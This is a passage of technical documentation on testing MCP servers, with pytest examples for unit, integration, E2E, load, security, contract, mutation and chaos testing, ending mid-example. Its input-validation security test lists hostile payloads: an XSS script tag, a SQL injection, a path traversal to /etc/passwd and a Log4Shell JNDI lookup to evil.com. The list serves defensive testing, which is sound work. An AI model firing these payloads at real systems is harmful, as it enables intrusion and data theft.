# Testing Strategy

**Navigation**: [Home](../README.md) > Quality & Operations > Testing Strategy  
**Related**: [← Previous: Integration Patterns](03e-integration-patterns.md) | [Next: Observability →](05-observability.md) | [Tool Testing](03-tool-implementation.md)

**Version:** 1.3.0  
**Last Updated:** November 19, 2025  
**Status:** Draft

## Introduction

Comprehensive testing is essential for reliable MCP servers. This document establishes testing standards covering unit tests, integration tests, end-to-end tests, load testing, security testing, and coverage requirements.

## Testing Pyramid

```mermaid
         /\
        /E2E\         <- Few (Critical user journeys)
       /------\
      / Integr \      <- Some (Component interactions)
     /----------\
    /    Unit    \    <- Many (Individual functions/tools)
   /--------------\
```

## Unit Testing

### Tool Unit Tests

Test each tool independently with mocked dependencies:

```python
import pytest
from unittest.mock import AsyncMock, patch, MagicMock
from datetime import datetime
from fastapi import HTTPException

# Tool under test
from mcp_server.tools import create_assignment, list_assignments

@pytest.mark.asyncio
class TestCreateAssignment:
    """Unit tests for create_assignment tool."""
    
    async def test_success(self):
        """Test successful assignment creation."""
        with patch('mcp_server.backend.create_assignment') as mock_create:
            # Mock successful response
            mock_assignment = AsyncMock()
            mock_assignment.id = "123"
            mock_assignment.title = "Test Task"
            mock_assignment.assignee = "user@example.com"
            mock_assignment.created_at = datetime(2025, 11, 18, 10, 0, 0)
            mock_create.return_value = mock_assignment
            
            # Execute tool
            result = await create_assignment(
                title="Test Task",
                assignee="user@example.com"
            )
            
            # Assertions
            assert result["success"] is True
            assert result["data"]["id"] == "123"
            assert result["data"]["title"] == "Test Task"
            assert "metadata" in result
            assert "timestamp" in result["metadata"]
            
            # Verify backend interaction
            mock_create.assert_called_once_with(
                "Test Task",
                "user@example.com"
            )
    
    async def test_empty_title(self):
        """Test validation error for empty title."""
        with pytest.raises(HTTPException) as exc_info:
            await create_assignment(
                title="",
                assignee="user@example.com"
            )
        
        assert exc_info.value.status_code == 400
        assert exc_info.value.detail["error"] == "invalid_input"
        assert "title" in exc_info.value.detail["details"]
    
    async def test_invalid_assignee_email(self):
        """Test validation error for invalid email."""
        with pytest.raises(HTTPException) as exc_info:
            await create_assignment(
                title="Test Task",
                assignee="not-an-email"
            )
        
        assert exc_info.value.status_code == 400
        assert "email" in exc_info.value.detail["details"]
    
    async def test_backend_failure(self):
        """Test handling of backend failures."""
        with patch('mcp_server.backend.create_assignment') as mock_create:
            # Mock backend exception
            mock_create.side_effect = Exception("Database connection failed")
            
            with pytest.raises(HTTPException) as exc_info:
                await create_assignment(
                    title="Test Task",
                    assignee="user@example.com"
                )
            
            assert exc_info.value.status_code == 500
            assert exc_info.value.detail["error"] == "internal_error"
    
    async def test_duplicate_assignment(self):
        """Test conflict when assignment already exists."""
        with patch('mcp_server.backend.create_assignment') as mock_create:
            # Mock conflict exception
            from backend.exceptions import ConflictException
            mock_create.side_effect = ConflictException(
                "Assignment already exists"
            )
            
            with pytest.raises(HTTPException) as exc_info:
                await create_assignment(
                    title="Duplicate Task",
                    assignee="user@example.com"
                )
            
            assert exc_info.value.status_code == 409
            assert exc_info.value.detail["error"] == "conflict"
```

### Parametrized Tests

Use parametrize for testing multiple scenarios:

```python
@pytest.mark.asyncio
@pytest.mark.parametrize("priority,expected_valid", [
    (1, True),
    (3, True),
    (5, True),
    (0, False),  # Below minimum
    (6, False),  # Above maximum
    (-1, False), # Negative
])
async def test_priority_validation(priority, expected_valid):
    """Test priority validation with various inputs."""
    if expected_valid:
        result = await create_assignment(
            title="Test",
            assignee="user@example.com",
            priority=priority
        )
        assert result["success"] is True
    else:
        with pytest.raises(HTTPException) as exc_info:
            await create_assignment(
                title="Test",
                assignee="user@example.com",
                priority=priority
            )
        assert exc_info.value.status_code == 400
```

### Fixture Patterns

Create reusable fixtures:

```python
import pytest
from datetime import datetime, timedelta

@pytest.fixture
def mock_assignment():
    """Fixture providing a mock assignment."""
    assignment = MagicMock()
    assignment.id = "test-123"
    assignment.title = "Test Assignment"
    assignment.assignee = "test@example.com"
    assignment.priority = 3
    assignment.status = "pending"
    assignment.created_at = datetime.utcnow()
    assignment.updated_at = datetime.utcnow()
    return assignment

@pytest.fixture
def mock_backend(mock_assignment):
    """Fixture providing a mocked backend."""
    with patch('mcp_server.backend') as mock:
        mock.create_assignment = AsyncMock(return_value=mock_assignment)
        mock.get_assignment = AsyncMock(return_value=mock_assignment)
        mock.list_assignments = AsyncMock(return_value=[mock_assignment])
        mock.update_assignment = AsyncMock(return_value=mock_assignment)
        mock.delete_assignment = AsyncMock(return_value=True)
        yield mock

@pytest.mark.asyncio
async def test_with_fixtures(mock_backend, mock_assignment):
    """Test using fixtures."""
    result = await create_assignment(
        title="Test",
        assignee="user@example.com"
    )
    
    assert result["success"] is True
    assert result["data"]["id"] == mock_assignment.id
    mock_backend.create_assignment.assert_called_once()
```

## Integration Testing

### Component Integration

Test interactions between components:

```python
import pytest
from httpx import AsyncClient
from mcp_server.app import app

@pytest.mark.asyncio
class TestAssignmentIntegration:
    """Integration tests for assignment workflows."""
    
    @pytest.fixture
    async def client(self):
        """HTTP client fixture."""
        async with AsyncClient(app=app, base_url="http://test") as client:
            yield client
    
    @pytest.fixture
    async def auth_headers(self):
        """Authenticated headers fixture."""
        # Get valid JWT token
        token = await get_test_token()
        return {"Authorization": f"Bearer {token}"}
    
    async def test_create_and_retrieve_assignment(self, client, auth_headers):
        """Test creating and retrieving an assignment."""
        # Create assignment
        create_response = await client.post(
            "/tools/create_assignment",
            json={
                "title": "Integration Test Task",
                "assignee": "user@example.com",
                "priority": 3
            },
            headers=auth_headers
        )
        
        assert create_response.status_code == 200
        assignment_data = create_response.json()
        assert assignment_data["success"] is True
        assignment_id = assignment_data["data"]["id"]
        
        # Retrieve assignment
        get_response = await client.get(
            f"/tools/get_assignment",
            params={"assignment_id": assignment_id},
            headers=auth_headers
        )
        
        assert get_response.status_code == 200
        retrieved_data = get_response.json()
        assert retrieved_data["data"]["id"] == assignment_id
        assert retrieved_data["data"]["title"] == "Integration Test Task"
    
    async def test_update_assignment_workflow(self, client, auth_headers):
        """Test full assignment update workflow."""
        # Create
        create_resp = await client.post(
            "/tools/create_assignment",
            json={
                "title": "Original Title",
                "assignee": "user1@example.com"
            },
            headers=auth_headers
        )
        assignment_id = create_resp.json()["data"]["id"]
        
        # Update
        update_resp = await client.put(
            "/tools/update_assignment",
            json={
                "assignment_id": assignment_id,
                "title": "Updated Title",
                "priority": 5
            },
            headers=auth_headers
        )
        
        assert update_resp.status_code == 200
        updated_data = update_resp.json()["data"]
        assert updated_data["title"] == "Updated Title"
        assert updated_data["priority"] == 5
        
        # Verify persistence
        get_resp = await client.get(
            f"/tools/get_assignment",
            params={"assignment_id": assignment_id},
            headers=auth_headers
        )
        persisted_data = get_resp.json()["data"]
        assert persisted_data["title"] == "Updated Title"
```

### Database Integration

Test with real database (use test containers):

```python
import pytest
import pytest_asyncio
from testcontainers.postgres import PostgresContainer
from sqlalchemy.ext.asyncio import create_async_engine, AsyncSession
from sqlalchemy.orm import sessionmaker

@pytest.fixture(scope="session")
def postgres_container():
    """PostgreSQL test container."""
    with PostgresContainer("postgres:15") as postgres:
        yield postgres

@pytest_asyncio.fixture
async def db_engine(postgres_container):
    """Database engine fixture."""
    db_url = postgres_container.get_connection_url().replace(
        "psycopg2", "asyncpg"
    )
    engine = create_async_engine(db_url, echo=True)
    
    # Create tables
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)
    
    yield engine
    
    # Cleanup
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.drop_all)
    await engine.dispose()

@pytest_asyncio.fixture
async def db_session(db_engine):
    """Database session fixture."""
    async_session = sessionmaker(
        db_engine,
        class_=AsyncSession,
        expire_on_commit=False
    )
    
    async with async_session() as session:
        yield session

@pytest.mark.asyncio
async def test_assignment_persistence(db_session):
    """Test assignment data persistence."""
    from mcp_server.models import Assignment
    
    # Create assignment
    assignment = Assignment(
        title="Persistent Task",
        assignee="user@example.com",
        priority=3
    )
    db_session.add(assignment)
    await db_session.commit()
    await db_session.refresh(assignment)
    
    assignment_id = assignment.id
    
    # Clear session
    await db_session.close()
    
    # Retrieve in new session
    async with db_session() as new_session:
        retrieved = await new_session.get(Assignment, assignment_id)
        assert retrieved is not None
        assert retrieved.title == "Persistent Task"
```

### External Service Integration

Test integrations with external services:

```python
import pytest
from unittest.mock import patch
import respx
from httpx import Response

@pytest.mark.asyncio
@respx.mock
async def test_external_api_integration():
    """Test integration with external API."""
    # Mock external API
    external_api = respx.post("https://api.external.com/validate")
    external_api.return_value = Response(
        200,
        json={"valid": True, "score": 0.95}
    )
    
    # Call tool that uses external API
    result = await validate_with_external_service(
        data={"email": "user@example.com"}
    )
    
    assert result["success"] is True
    assert result["data"]["valid"] is True
    assert external_api.called

@pytest.mark.asyncio
async def test_external_api_timeout():
    """Test handling of external API timeout."""
    with patch('httpx.AsyncClient.post') as mock_post:
        # Mock timeout
        import asyncio
        mock_post.side_effect = asyncio.TimeoutError()
        
        with pytest.raises(HTTPException) as exc_info:
            await validate_with_external_service(
                data={"email": "user@example.com"}
            )
        
        assert exc_info.value.status_code == 504
        assert exc_info.value.detail["error"] == "timeout"
```

## End-to-End Testing

### User Journey Tests

Test complete user workflows:

```python
import pytest
from playwright.async_api import async_playwright

@pytest.mark.e2e
@pytest.mark.asyncio
async def test_complete_assignment_workflow():
    """E2E test for complete assignment workflow."""
    async with async_playwright() as p:
        browser = await p.chromium.launch()
        context = await browser.new_context()
        page = await context.new_page()
        
        # Login
        await page.goto("https://app.example.com/login")
        await page.fill("#email", "test@example.com")
        await page.fill("#password", "testpass")
        await page.click("#login-button")
        
        # Wait for dashboard
        await page.wait_for_selector("#dashboard")
        
        # Create assignment via UI
        await page.click("#create-assignment")
        await page.fill("#assignment-title", "E2E Test Task")
        await page.fill("#assignee-email", "assignee@example.com")
        await page.select_option("#priority", "3")
        await page.click("#save-assignment")
        
        # Verify created
        await page.wait_for_selector(".assignment-card")
        assignment_text = await page.text_content(".assignment-card .title")
        assert assignment_text == "E2E Test Task"
        
        # Update assignment
        await page.click(".assignment-card")
        await page.click("#edit-button")
        await page.fill("#assignment-title", "Updated E2E Task")
        await page.click("#save-button")
        
        # Verify update
        await page.wait_for_selector(".success-message")
        updated_text = await page.text_content(".assignment-card .title")
        assert updated_text == "Updated E2E Task"
        
        # Delete assignment
        await page.click("#delete-button")
        await page.click("#confirm-delete")
        
        # Verify deletion
        await page.wait_for_selector(".empty-state")
        
        await browser.close()
```

### API E2E Tests

Test complete API workflows:

```python
import pytest
from httpx import AsyncClient

@pytest.mark.e2e
@pytest.mark.asyncio
async def test_api_workflow():
    """E2E test for API workflow."""
    async with AsyncClient(base_url="https://api.example.com") as client:
        # Authenticate
        auth_resp = await client.post(
            "/auth/token",
            json={
                "username": "test@example.com",
                "password": "testpass"
            }
        )
        assert auth_resp.status_code == 200
        token = auth_resp.json()["access_token"]
        headers = {"Authorization": f"Bearer {token}"}
        
        # Create resource
        create_resp = await client.post(
            "/api/v1/assignments",
            json={
                "title": "API E2E Task",
                "assignee": "user@example.com"
            },
            headers=headers
        )
        assert create_resp.status_code == 201
        resource_id = create_resp.json()["id"]
        
        # Retrieve resource
        get_resp = await client.get(
            f"/api/v1/assignments/{resource_id}",
            headers=headers
        )
        assert get_resp.status_code == 200
        assert get_resp.json()["title"] == "API E2E Task"
        
        # List resources
        list_resp = await client.get(
            "/api/v1/assignments",
            headers=headers
        )
        assert list_resp.status_code == 200
        assert len(list_resp.json()["items"]) > 0
        
        # Update resource
        update_resp = await client.patch(
            f"/api/v1/assignments/{resource_id}",
            json={"status": "completed"},
            headers=headers
        )
        assert update_resp.status_code == 200
        
        # Delete resource
        delete_resp = await client.delete(
            f"/api/v1/assignments/{resource_id}",
            headers=headers
        )
        assert delete_resp.status_code == 204
        
        # Verify deletion
        get_deleted = await client.get(
            f"/api/v1/assignments/{resource_id}",
            headers=headers
        )
        assert get_deleted.status_code == 404
```

## Load Testing

### Locust Load Tests

```python
from locust import HttpUser, task, between

class MCPServerUser(HttpUser):
    """Load test user for MCP server."""
    
    wait_time = between(1, 3)
    
    def on_start(self):
        """Authenticate on start."""
        response = self.client.post(
            "/auth/token",
            json={
                "username": "loadtest@example.com",
                "password": "loadtest"
            }
        )
        self.token = response.json()["access_token"]
        self.headers = {"Authorization": f"Bearer {self.token}"}
    
    @task(3)
    def list_assignments(self):
        """List assignments (most common operation)."""
        self.client.get(
            "/tools/list_assignments",
            headers=self.headers,
            name="list_assignments"
        )
    
    @task(2)
    def get_assignment(self):
        """Get single assignment."""
        self.client.get(
            "/tools/get_assignment",
            params={"assignment_id": "test-123"},
            headers=self.headers,
            name="get_assignment"
        )
    
    @task(1)
    def create_assignment(self):
        """Create assignment (less common)."""
        self.client.post(
            "/tools/create_assignment",
            json={
                "title": f"Load Test Task {self.environment.runner.user_count}",
                "assignee": "loadtest@example.com"
            },
            headers=self.headers,
            name="create_assignment"
        )
```

Run load tests:

```bash
# Start load test
locust -f tests/load/locustfile.py \
  --host https://api.example.com \
  --users 100 \
  --spawn-rate 10 \
  --run-time 5m \
  --html report.html
```

### Performance Benchmarks

Define performance SLAs:

```python
import pytest
import time

@pytest.mark.benchmark
@pytest.mark.asyncio
async def test_list_assignments_performance(benchmark):
    """Benchmark list_assignments performance."""
    
    async def run_list():
        return await list_assignments(page=1, page_size=50)
    
    result = await benchmark(run_list)
    
    # Assert performance SLA
    assert benchmark.stats.mean < 0.1  # < 100ms average
    assert benchmark.stats.max < 0.5   # < 500ms p99

@pytest.mark.benchmark
@pytest.mark.asyncio
async def test_create_assignment_performance():
    """Benchmark create_assignment latency."""
    measurements = []
    
    for _ in range(100):
        start = time.perf_counter()
        await create_assignment(
            title=f"Benchmark Task {_}",
            assignee="benchmark@example.com"
        )
        elapsed = time.perf_counter() - start
        measurements.append(elapsed)
    
    # Calculate percentiles
    p50 = sorted(measurements)[50]
    p95 = sorted(measurements)[95]
    p99 = sorted(measurements)[99]
    
    # Assert SLAs
    assert p50 < 0.05  # p50 < 50ms
    assert p95 < 0.15  # p95 < 150ms
    assert p99 < 0.30  # p99 < 300ms
```

## Security Testing

### Authentication Tests

```python
import pytest
from httpx import AsyncClient

@pytest.mark.security
@pytest.mark.asyncio
async def test_missing_token():
    """Test request without authentication token."""
    async with AsyncClient(base_url="http://test") as client:
        response = await client.get("/tools/list_assignments")
        assert response.status_code == 401

@pytest.mark.security
@pytest.mark.asyncio
async def test_invalid_token():
    """Test request with invalid token."""
    async with AsyncClient(base_url="http://test") as client:
        response = await client.get(
            "/tools/list_assignments",
            headers={"Authorization": "Bearer invalid-token"}
        )
        assert response.status_code == 401

@pytest.mark.security
@pytest.mark.asyncio
async def test_expired_token():
    """Test request with expired token."""
    expired_token = generate_expired_token()
    
    async with AsyncClient(base_url="http://test") as client:
        response = await client.get(
            "/tools/list_assignments",
            headers={"Authorization": f"Bearer {expired_token}"}
        )
        assert response.status_code == 401
        assert "expired" in response.json()["detail"]["message"].lower()
```

### Authorization Tests

```python
@pytest.mark.security
@pytest.mark.asyncio
async def test_unauthorized_access():
    """Test accessing resource without permission."""
    # User without admin role
    user_token = await get_token_for_role("user")
    
    async with AsyncClient(base_url="http://test") as client:
        response = await client.delete(
            "/tools/delete_all_assignments",
            headers={"Authorization": f"Bearer {user_token}"}
        )
        assert response.status_code == 403

@pytest.mark.security
@pytest.mark.asyncio
async def test_resource_isolation():
    """Test users can only access their own resources."""
    user1_token = await get_token_for_user("user1@example.com")
    user2_token = await get_token_for_user("user2@example.com")
    
    async with AsyncClient(base_url="http://test") as client:
        # User1 creates assignment
        create_resp = await client.post(
            "/tools/create_assignment",
            json={"title": "User1 Task", "assignee": "user1@example.com"},
            headers={"Authorization": f"Bearer {user1_token}"}
        )
        assignment_id = create_resp.json()["data"]["id"]
        
        # User2 attempts to access User1's assignment
        get_resp = await client.get(
            f"/tools/get_assignment",
            params={"assignment_id": assignment_id},
            headers={"Authorization": f"Bearer {user2_token}"}
        )
        assert get_resp.status_code == 404  # Not found (hidden for security)
```

### Input Validation Tests

```python
@pytest.mark.security
@pytest.mark.parametrize("malicious_input", [
    "<script>alert('xss')</script>",
    "'; DROP TABLE assignments; --",
    "../../../etc/passwd",
    "${jndi:ldap://evil.com/a}",
])
@pytest.mark.asyncio
async def test_input_sanitization(malicious_input):
    """Test input sanitization against common attacks."""
    with pytest.raises(HTTPException) as exc_info:
        await create_assignment(
            title=malicious_input,
            assignee="user@example.com"
        )
    
    assert exc_info.value.status_code == 400
    assert "invalid_input" in exc_info.value.detail["error"]
```

## Coverage Requirements

### Coverage Configuration

```ini
# .coveragerc or pyproject.toml [tool.coverage]

[coverage:run]
source = mcp_server
omit =
    */tests/*
    */migrations/*
    */__pycache__/*
    */venv/*

[coverage:report]
precision = 2
show_missing = True
skip_covered = False

# Fail build if coverage below threshold
fail_under = 80

exclude_lines =
    pragma: no cover
    def __repr__
    raise AssertionError
    raise NotImplementedError
    if __name__ == .__main__.:
    if TYPE_CHECKING:
```

### Coverage Targets

| Component | Minimum Coverage |
|-----------|-----------------|
| Tools | 90% |
| Business Logic | 85% |
| API Endpoints | 80% |
| Utilities | 80% |
| Overall | 80% |

### Run Coverage

```bash
# Run tests with coverage
pytest --cov=mcp_server \
  --cov-report=html \
  --cov-report=term \
  --cov-report=xml \
  tests/

# View HTML report
open htmlcov/index.html

# Check coverage threshold
pytest --cov=mcp_server \
  --cov-fail-under=80 \
  tests/
```

## Test Organization

### Directory Structure

```text
tests/
├── unit/
│   ├── test_tools.py
│   ├── test_auth.py
│   ├── test_models.py
│   └── test_utils.py
├── integration/
│   ├── test_api.py
│   ├── test_database.py
│   └── test_external_services.py
├── e2e/
│   ├── test_user_workflows.py
│   └── test_api_workflows.py
├── load/
│   └── locustfile.py
├── security/
│   ├── test_authentication.py
│   ├── test_authorization.py
│   └── test_input_validation.py
├── conftest.py
└── pytest.ini
```

### Test Configuration

```ini
# pytest.ini
[pytest]
minversion = 7.0
testpaths = tests
python_files = test_*.py
python_classes = Test*
python_functions = test_*

# Markers
markers =
    unit: Unit tests
    integration: Integration tests
    e2e: End-to-end tests
    security: Security tests
    benchmark: Performance benchmarks
    slow: Slow-running tests

# Async support
asyncio_mode = auto

# Coverage
addopts =
    --strict-markers
    --tb=short
    --cov=mcp_server
    --cov-report=term-missing
    --cov-report=html
    --cov-report=xml
    -ra
    -q

# Ignore warnings
filterwarnings =
    ignore::DeprecationWarning
```

## CI/CD Integration

### GitHub Actions Workflow

```yaml
# .github/workflows/test.yml
name: Tests

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main, develop]

jobs:
  test:
    runs-on: ubuntu-latest
    
    strategy:
      matrix:
        python-version: ["3.11", "3.12"]
    
    steps:
      - uses: actions/checkout@v4
      
      - name: Set up Python ${{ matrix.python-version }}
        uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python-version }}
      
      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -r requirements.txt
          pip install -r requirements-dev.txt
      
      - name: Run unit tests
        run: pytest tests/unit -v
      
      - name: Run integration tests
        run: pytest tests/integration -v
      
      - name: Run security tests
        run: pytest tests/security -v
      
      - name: Upload coverage
        uses: codecov/codecov-action@v3
        with:
          files: ./coverage.xml
          flags: unittests
          name: codecov-umbrella
  
  e2e:
    runs-on: ubuntu-latest
    needs: test
    
    steps:
      - uses: actions/checkout@v4
      
      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.12"
      
      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -r requirements.txt
          pip install -r requirements-dev.txt
      
      - name: Run E2E tests
        run: pytest tests/e2e -v
```

## Contract Testing

### Provider Contract Tests

Verify MCP server conforms to protocol specification:

```python
# tests/contract/test_mcp_protocol.py
"""Contract tests for MCP protocol compliance."""

import pytest
from mcp_protocol_validator import MCPValidator

validator = MCPValidator()

def test_tools_list_contract():
    """Verify tools/list endpoint matches MCP spec."""
    response = client.post("/mcp/v1/tools/list")
    
    # Validate response structure
    validator.validate_tools_list_response(response.json())
    
    assert response.status_code == 200
    assert "tools" in response.json()
    
    # Each tool must have required fields
    for tool in response.json()["tools"]:
        assert "name" in tool
        assert "description" in tool
        assert "inputSchema" in tool

def test_tool_call_contract():
    """Verify tool call endpoint matches MCP spec."""
    response = client.post(
        "/mcp/v1/tools/call",
        json={
            "name": "create_assignment",
            "arguments": {"title": "Test", "assignee": "user@example.com"}
        }
    )
    
    # Validate response structure
    validator.validate_tool_call_response(response.json())
    
    assert response.status_code == 200
    assert "content" in response.json()
    assert isinstance(response.json()["content"], list)

def test_resource_contract():
    """Verify resource endpoint matches MCP spec."""
    response = client.post(
        "/mcp/v1/resources/read",
        json={"uri": "mcp://server/docs/readme.md"}
    )
    
    validator.validate_resource_response(response.json())
    
    assert "contents" in response.json()
```

### Consumer Contract Tests

Mock external API contracts using Pact:

```python
# tests/contract/test_github_api.py
"""Contract tests for GitHub API integration."""

import pytest
from pact import Consumer, Provider

pact = Consumer('mcp-server').has_pact_with(Provider('github-api'))

def test_get_repository_contract():
    """Mock GitHub repository API response."""
    (pact
     .given('Repository exists')
     .upon_receiving('Get repository request')
     .with_request('GET', '/repos/owner/repo')
     .will_respond_with(200, body={
         'id': 123,
         'name': 'repo',
         'full_name': 'owner/repo',
         'owner': {'login': 'owner'},
         'private': False
     }))
    
    with pact:
        # Test code that calls GitHub API
        result = github_client.get_repository('owner', 'repo')
        assert result['name'] == 'repo'

def test_create_issue_contract():
    """Mock GitHub issue creation."""
    (pact
     .given('Repository exists')
     .upon_receiving('Create issue request')
     .with_request('POST', '/repos/owner/repo/issues', body={
         'title': 'Bug report',
         'body': 'Description'
     })
     .will_respond_with(201, body={
         'id': 456,
         'number': 1,
         'title': 'Bug report',
         'state': 'open'
     }))
    
    with pact:
        result = github_client.create_issue(
            'owner',
            'repo',
            'Bug report',
            'Description'
        )
        assert result['number'] == 1
```

### Schema Validation Tests

Ensure tool schemas are valid JSON Schema:

```python
# tests/contract/test_tool_schemas.py
"""Validate tool input schemas."""

import jsonschema
import pytest

def test_all_tool_schemas_valid():
    """Ensure all tool schemas are valid JSON Schema."""
    tools = mcp.list_tools()
    
    for tool in tools:
        try:
            # Validate schema itself
            jsonschema.Draft7Validator.check_schema(tool.inputSchema)
        except jsonschema.SchemaError as e:
            pytest.fail(f"Invalid schema for tool {tool.name}: {e}")

def test_tool_schema_validates_valid_input():
    """Test schema accepts valid input."""
    schema = get_tool_schema("create_assignment")
    
    valid_input = {
        "title": "Test Assignment",
        "assignee": "user@example.com",
        "priority": 3
    }
    
    jsonschema.validate(valid_input, schema)  # Should not raise

def test_tool_schema_rejects_invalid_input():
    """Test schema rejects invalid input."""
    schema = get_tool_schema("create_assignment")
    
    invalid_input = {
        "title": "",  # Empty string should fail
        "assignee": "not-an-email"  # Invalid email
    }
    
    with pytest.raises(jsonschema.ValidationError):
        jsonschema.validate(invalid_input, schema)
```

## Test Data Management Strategies

### Fixture-Based Data

```python
# tests/fixtures/data.py
import pytest
from datetime import datetime, timedelta

@pytest.fixture
def sample_user():
    """Provide a standard test user."""
    return {
        "id": "test-user-123",
        "email": "test@example.com",
        "name": "Test User",
        "role": "developer",
        "created_at": datetime(2025, 1, 1)
    }

@pytest.fixture
def sample_assignments(sample_user):
    """Provide test assignments."""
    return [
        {
            "id": f"assignment-{i}",
            "title": f"Task {i}",
            "assignee_id": sample_user["id"],
            "status": "in_progress",
            "priority": i % 5 + 1
        }
        for i in range(1, 11)
    ]
```

### Factory Pattern with Faker

```bash
pip install factory-boy faker
```

```python
# tests/factories.py
import factory
from factory import Faker, LazyAttribute
from datetime import datetime, timedelta
import random

class UserFactory(factory.Factory):
    """Factory for creating test users."""
    
    class Meta:
        model = dict
    
    id = factory.Sequence(lambda n: f"user-{n}")
    email = Faker("email")
    name = Faker("name")
    role = factory.Iterator(["developer", "manager", "admin"])
    created_at = LazyAttribute(
        lambda _: datetime.now() - timedelta(days=random.randint(1, 365))
    )

class AssignmentFactory(factory.Factory):
    """Factory for creating test assignments."""
    
    class Meta:
        model = dict
    
    id = factory.Sequence(lambda n: f"assignment-{n}")
    title = Faker("sentence", nb_words=4)
    assignee_id = factory.LazyFunction(lambda: UserFactory().id)
    status = factory.Iterator(["todo", "in_progress", "done"])
    priority = factory.LazyFunction(lambda: random.randint(1, 5))

# Usage
async def test_bulk_operations():
    """Test with factory-generated data."""
    assignments = [AssignmentFactory() for _ in range(100)]
    result = await bulk_create_assignments(assignments)
    assert len(result) == 100
```

### Snapshot Testing for Response Validation

```bash
pip install syrupy
```

```python
# tests/snapshots/test_responses.py
import pytest
from syrupy import SnapshotAssertion

@pytest.mark.asyncio
async def test_assignment_list_snapshot(snapshot: SnapshotAssertion):
    """Verify assignment list structure doesn't regress."""
    result = await list_assignments(limit=3)
    
    # Sanitize dynamic fields
    sanitized = [
        {**item, "created_at": "TIMESTAMP", "id": "ID"}
        for item in result["data"]
    ]
    
    assert sanitized == snapshot

@pytest.mark.asyncio
async def test_error_response_snapshot(snapshot: SnapshotAssertion):
    """Verify error response structure consistency."""
    with pytest.raises(HTTPException) as exc_info:
        await create_assignment(title="", assignee="invalid")
    
    error_response = {
        "status_code": exc_info.value.status_code,
        "error_type": exc_info.value.detail.get("error"),
        "field_errors": sorted(exc_info.value.detail.get("details", {}).keys())
    }
    
    assert error_response == snapshot
```

**Update snapshots:**

```bash
pytest --snapshot-update
```

### Mock vs Real Service Decision Matrix

| Criteria | Use Mock | Use Real Service |
|----------|----------|------------------|
| **Speed** | Slow external API (> 1s) | Fast local service (< 100ms) |
| **Determinism** | Non-deterministic responses | Deterministic behavior |
| **Cost** | Paid API calls | Free/internal services |
| **Availability** | Unreliable service | Always available |
| **Test Type** | Unit tests | E2E tests |
| **Environment** | CI/CD pipelines | Local development |
| **Data Isolation** | Shared state concerns | Isolated test data |
| **Network** | External network calls | Internal services |

**Implementation:**

```python
# Unit Tests: Always mock
@pytest.fixture
def mock_external_api():
    """Mock external API."""
    with patch('httpx.AsyncClient.post') as mock_post:
        mock_post.return_value.status_code = 200
        mock_post.return_value.json.return_value = {"success": True}
        yield mock_post

# Integration Tests: Real database, mock expensive services
@pytest.fixture(scope="session")
async def real_database():
    """Use real PostgreSQL for integration tests."""
    import asyncpg
    db = await asyncpg.connect(os.environ["TEST_DATABASE_URL"])
    await db.execute("CREATE SCHEMA IF NOT EXISTS test")
    yield db
    await db.execute("DROP SCHEMA test CASCADE")
    await db.close()

@pytest.fixture
def mock_payment_processor():
    """Mock expensive payment processor."""
    with patch('stripe.Charge.create') as mock_charge:
        mock_charge.return_value = {"id": "ch_test", "paid": True}
        yield mock_charge
```

## Mutation Testing

Mutation testing validates test suite quality by introducing bugs and verifying tests catch them.

### Setup with mutmut

```bash
pip install mutmut
```

**Configuration (`.mutmut`):**

```ini
[mutmut]
paths_to_mutate=src/mcp_server/
tests_dir=tests/
runner=python -m pytest -x
dict_synonyms=Struct,NamedStruct
```

**Run mutation testing:**

```bash
# Run all mutations
mutmut run

# Show results
mutmut results

# Show specific mutation
mutmut show 1

# Apply mutation to see what changed
mutmut apply 1
```

**Example Output:**

```text
- Total mutations: 247
- Survived:        15  (6%)   ← Tests didn't catch these mutations
- Killed:         220  (89%)  ← Tests caught these mutations
- Timeout:          5  (2%)
- Suspicious:       7  (3%)
```

**Analyze Survivors:**

```bash
# Show survived mutations
mutmut show survived

# Example survivor
# Original:  if priority > 0:
# Mutated:   if priority >= 0:
# Fix: Add test for priority=0 edge case
```

**Best Practices:**

- Run mutations on critical code paths first
- Focus on business logic over infrastructure
- Aim for < 10% survived mutations
- Add tests for each survived mutation
- Run in CI on changed files only (fast feedback)

```python
# Example test improvement from mutation analysis
# Survivor found: changed > to >= in validation
# Add edge case test:
async def test_priority_zero_boundary():
    """Test priority validation at zero boundary."""
    with pytest.raises(HTTPException):
        await create_assignment(
            title="Test",
            assignee="user@example.com",
            priority=0  # Should fail (minimum is 1)
        )
```

## Chaos Engineering for Resilience

Chaos engineering validates system resilience by injecting controlled failures.

### Chaos Testing with pytest-chaos

```bash
pip install pytest-chaos
```

**Configuration:**

```python
# tests/chaos/test_resilience.py
import pytest
from pytest_chaos import chaos_monkey

@pytest.mark.asyncio
@chaos_monkey(error_rate=0.2, latency_ms=500)
async def test_retry_logic_under_chaos():
    """Verify retry logic handles intermittent failures."""
    result = await fetch_data_with_retries(
        url="https://api.example.com/data",
        max_retries=3
    )
    assert result is not None

@pytest.mark.asyncio
async def test_circuit_breaker_under_failures():
    """Verify circuit breaker opens after threshold failures."""
    from circuit_breaker import CircuitBreakerOpen
    
    # Inject consistent failures
    with patch('httpx.AsyncClient.get') as mock_get:
        mock_get.side_effect = Exception("Service unavailable")
        
        # Should fail fast after circuit opens
        with pytest.raises(CircuitBreakerOpen):
            for _ in range(10):
                await fetch_with_circuit_breaker()
```

### Manual Failure Injection

```python
# tests/chaos/failure_injection.py
import random
import asyncio

class ChaosMiddleware:
    """Inject random failures for chaos testing."""
    
    def __init__(self, error_rate=0.1, latency_range=(100, 2000)):
        self.error_rate = error_rate
        self.latency_range = latency_range
    
    async def __call__(self, func):
        """Wrap function with chaos injection."""
        # Random latency
        if random.random() < 0.3:
            delay = random.randint(*self.latency_range) / 1000
            await asyncio.sleep(delay)
        
        # Random failure
        if random.random() < self.error_rate:
            raise Exception("Chaos-injected failure")
        
        return await func()

# Usage
@pytest.fixture
def chaos_enabled():
    """Enable chaos for resilience tests."""
    return ChaosMiddleware(error_rate=0.2)

@pytest.mark.asyncio
async def test_graceful_degradation(chaos_enabled):
    """Verify service degrades gracefully under chaos."""
    results = []
    
    for _ in range(100):
        try:
